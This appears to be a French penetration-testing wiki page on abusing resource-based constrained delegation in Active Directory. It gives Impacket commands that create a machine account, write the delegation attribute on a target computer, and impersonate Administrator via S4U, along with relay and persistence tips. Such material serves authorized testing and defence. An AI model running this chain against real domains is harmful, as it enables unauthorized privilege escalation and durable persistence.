---
title: "Délégation contrainte basée sur les ressources : usurpation depuis un objet inscriptible"
description: "Abuser de la délégation contrainte basée sur les ressources (RBCD) en écrivant msDS-AllowedToActOnBehalfOfOtherIdentity sur un objet ordinateur cible pour permettre à un compte contrôlé d'usurper n'importe quel utilisateur auprès de cette cible, le chemin courant de relais et d'escalade par ACL."
keywords:
  - RBCD
  - délégation contrainte basée sur les ressources
  - msDS-AllowedToActOnBehalfOfOtherIdentity
  - quota de comptes machine
  - S4U
---

# Délégation contrainte basée sur les ressources

La délégation contrainte basée sur les ressources (RBCD) inverse l'endroit où la confiance de délégation est stockée. Au lieu que le compte de délégation liste ses cibles, c'est l'ordinateur **cible** qui nomme qui peut usurper des utilisateurs auprès de lui, dans `msDS-AllowedToActOnBehalfOfOtherIdentity`. Cela en fait une primitive d'escalade : si vous pouvez **écrire** cet attribut sur un objet ordinateur, vous pouvez le pointer vers un compte que vous contrôlez puis usurper n'importe qui auprès de cet ordinateur.

## L'attaque

Deux choses sont nécessaires : un accès en écriture à l'attribut de la cible, et un compte doté d'un SPN depuis lequel déléguer.

```bash
# 1. Create a computer account to delegate from (default quota allows 10 per user)
addcomputer.py -computer-name 'EVIL$' -computer-pass 'Passw0rd!' example.local/user:pass

# 2. Write the delegation attribute on the target (needs write over the target object)
rbcd.py -delegate-from 'EVIL$' -delegate-to 'TARGET$' -action write \
  example.local/user:pass

# 3. S4U: impersonate a privileged user to a service on the target
getST.py -spn cifs/target.example.local -impersonate Administrator \
  -hashes :<EVIL$-hash> example.local/EVIL$
```

La permission d'écriture de l'étape 2 provient typiquement d'une découverte d'ACL ([énumération des ACL](../../../dacl/acl-enumeration.md)) : `GenericWrite`, `GenericAll`, `WriteProperty` ou `WriteDacl` sur l'objet ordinateur.

## Deux sources courantes de l'écriture

- **Une ACL abusable** sur un objet ordinateur (depuis BloodHound), le chemin direct.
- **Relais NTLM vers LDAP** : relayer une authentification machine forcée vers LDAP et poser le RBCD sur l'ordinateur victime, de sorte que la coercition combinée au relais donne un accès administrateur local sur cette machine ([relais NTLM](../../ntlm/relay.md)).

Le compte depuis lequel déléguer a besoin d'un SPN ; l'astuce habituelle consiste à créer un nouveau compte d'ordinateur, qui en possède un et que le **quota de comptes machine** par défaut (`ms-DS-MachineAccountQuota = 10`) permet à tout utilisateur du domaine de créer.

## Notes d'exploitation

- Le RBCD est réversible et discret à poser : écrire un seul attribut accorde une usurpation durable auprès de la cible, ce qui en fait une escalade de prédilection et un point d'appui de persistance.
- Lorsque le quota de comptes machine est à 0, utilisez un compte existant que vous contrôlez et qui possède (ou peut recevoir) un SPN au lieu de créer un nouvel ordinateur.
- Le résultat est un ticket forwardable en tant que l'utilisateur usurpé vers les services de la cible ; visez `cifs/` ou `host/` pour l'accès aux fichiers ou l'exécution.

## Outils

- **Impacket** (`rbcd.py`, `addcomputer.py`, `getST.py`) : la chaîne complète écriture-puis-S4U.
- **PowerView / Powermad** : poser l'attribut et ajouter des comptes d'ordinateur depuis Windows.
- **ntlmrelayx.py `--delegate-access`** : poser le RBCD via un LDAP relayé.

## Références

- [Elad Shamir: Wagging the Dog (RBCD)](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
- [Impacket rbcd.py / addcomputer.py / getST.py](https://github.com/fortra/impacket)
- [ntlmrelayx --delegate-access](https://github.com/fortra/impacket)
